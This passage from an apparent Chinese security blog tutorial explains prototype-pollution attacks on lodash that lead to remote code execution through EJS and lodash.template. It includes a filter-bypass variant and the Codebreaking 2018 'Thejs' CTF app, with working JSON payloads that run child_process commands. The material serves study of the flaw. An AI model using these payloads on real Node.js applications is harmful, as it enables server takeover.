&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;views engine&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;ejs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//对原型进行污染 __proto__.xxx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">malicious_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;{&amp;#34;__proto__&amp;#34;:{&amp;#34;outputFunctionName&amp;#34;:&amp;#34;_tmp1;global.process.mainModule.require(\&amp;#39;child_process\&amp;#39;).exec(\&amp;#39;calc\&amp;#39;);var __tmp2&amp;#34;}}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 4.17.4之后版本进行`__proto__`过滤 使用Object.constructor.prototype绕过
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// var malicious_payload = &amp;#39;{&amp;#34;Object&amp;#34;:{&amp;#34;constructor&amp;#34;:{&amp;#34;prototype&amp;#34;:{&amp;#34;outputFunctionName&amp;#34;: &amp;#34;_tmp1;global.process.mainModule.constructor._load(\&amp;#39;child_process\&amp;#39;).execSync(\&amp;#39;calc\&amp;#39;);var __tmp2&amp;#34;}}}}&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">merge&lt;/span>&lt;span style="color:#111">({},&lt;/span> &lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">malicious_payload&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//进行渲染
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.ejs&amp;#34;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami test&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;应用实例，访问地址为 http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216193535948.png" alt="image-20211216193535948">&lt;/p>
&lt;p>在第12行下断点&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216194516601.png" alt="image-20211216194516601">&lt;/p>
&lt;p>可以看到在它执行结束之后Object的原型链上多了一个&lt;code>outputFunctionName&lt;/code>，我们先跟进调用看看后面接入ejs的部分是怎么执行的；在16行打断点，刷新后看render方法&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202304738.png" alt="image-20211216202304738">&lt;/p>
&lt;p>跟入app.render()，express\lib\application.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202413998.png" alt="image-20211216202413998">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202548944.png" alt="image-20211216202548944">&lt;/p>
&lt;p>跟进view.render()，express\lib\view.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216205348481.png" alt="image-20211216205348481">&lt;/p>
&lt;p>可见我们的恶意代码部分被以options参数的形式加载到了this.engine中，之后engine选用ejs模板引擎，进入ejs\lib\ejs.js&lt;/p>
&lt;p>进入renderFile函数，返回tryHandleCache()，跟入&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204703770.png" alt="image-20211216204703770">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204731800.png" alt="image-20211216204731800">&lt;/p>
&lt;p>跟入compile，这里有大量的字符串拼接，我们的恶意代码就这样被拼进去了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204911158.png" alt="image-20211216204911158">&lt;/p>
&lt;p>这里的&lt;code>opts.outputFunctionName&lt;/code>正是我们污染的&lt;code>opts.__proto__outputFunctionName&lt;/code>，也就是一开始进入render的opts&lt;/p>
&lt;p>倒叙了属于是，看一下这个lodash.merge的整个过程&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223141129212.png" alt="image-20211223141129212">&lt;/p>
&lt;p>注意到这里的函数和注释，就很有原型污染的可能啊&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216213329296.png" alt="image-20211216213329296">&lt;/p>
&lt;p>当我们的payload从这里传入的时候，在进入&lt;code>baseMergeDeep&lt;/code>之后会先有一个&lt;code>safeGet&lt;/code>的过滤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142008142.png" alt="image-20211223142008142">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223141632227.png" alt="image-20211223141632227">&lt;/p>
&lt;p>但是我们用&lt;code>prototype&lt;/code>就轻松绕过了，之后&lt;code>srcvalue&lt;/code>被赋给&lt;code>newValue&lt;/code>，进入&lt;code>assignMergeValue&lt;/code>，调用一次&lt;code>baseAssginValue&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142953795.png" alt="image-20211223142953795">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142803073.png" alt="image-20211223142803073">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223143141313.png" alt="image-20211223143141313">&lt;/p>
&lt;p>彻底将&lt;code>prototype&lt;/code>的值赋给我们的payload，做到原型污染&lt;/p>
&lt;h4 id="lodashtemplate">lodash.template&lt;/h4>
&lt;p>直接拿p牛的题举例了，这个洞是最近不久才被修复，不过虽然这里利用的同样是&lt;code>lodash.merge&lt;/code>，不过却和上面的&lt;code>lodash.merge&lt;/code>不是一条调用链，所以受影响版本不同&lt;/p>
&lt;h5 id="codebreaking-2018thejs">[Codebreaking 2018]Thejs&lt;/h5>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">bodyParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">lodash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lodash&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express-session&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">randomize&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;randomatic&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bodyParser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">})).&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bodyParser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/static&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;static&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;thejs.session&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">secret&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">randomize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;aA0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resave&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">saveUninitialized&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">engine&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ejs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">callback&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// define the template engine
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">callback&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">compiled&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 继承自lodash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">rendered&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">compiled&lt;/span>&lt;span style="color:#111">({...&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">callback&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">rendered&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./views&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;view engine&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;ejs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[],&lt;/span> &lt;span style="color:#75af00">category&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 可以原型链污染lodash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">data&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">language&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">category&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Example app listening on port 3000!`&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们可以通过污染&lt;code>loadsh.merge&lt;/code>给&lt;code>Object&lt;/code>对象插入任意属性，最后污染&lt;code>loadsh.template&lt;/code>；具体污染&lt;code>lodash.template&lt;/code>的哪个属性，还要参考源码&lt;/p>
&lt;pre tabindex="0">&lt;code>// https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165
// Use a sourceURL for easier debugging.
var sourceURL = &amp;#39;sourceURL&amp;#39; in options ? &amp;#39;//# sourceURL=&amp;#39; + options.sourceURL + &amp;#39;\n&amp;#39; : &amp;#39;&amp;#39;;
// ...
var result = attempt(function() {
return Function(importsKeys, sourceURL + &amp;#39;return &amp;#39; + source)
.apply(undefined, importsValues);
});
&lt;/code>&lt;/pre>&lt;p>&lt;code>options.sourceURL&lt;/code>没有赋值，取空字符串，我们给所有&lt;code>Object&lt;/code>对象插入一个&lt;code>sourceURL&lt;/code>属性，就会被拼入&lt;code>return Function&lt;/code>的第二个参数中造成rce&lt;/p>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">:{&lt;/span>&lt;span style="color:#f92672">&amp;#34;sourceURL&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;\u000areturn e=&amp;gt;{for(var a in {}){delete Object.prototype[a];}return global.process.mainModule.consturctor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;ls /&amp;#39;).toString()}\u000a//&amp;#34;&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="借助其它库扩大攻击面">借助其它库扩大攻击面&lt;/h3>
&lt;h4 id="express-validator--lodash">express-validator + lodash&lt;/h4>
&lt;ul>
&lt;li>lodash&amp;lt;4.17.17&lt;/li>
&lt;/ul>
&lt;p>来源于一道CTF题（而且被抄了2次还），在本身lodash存在原型污染的情况下结合其它库扩大攻击面&lt;/p>
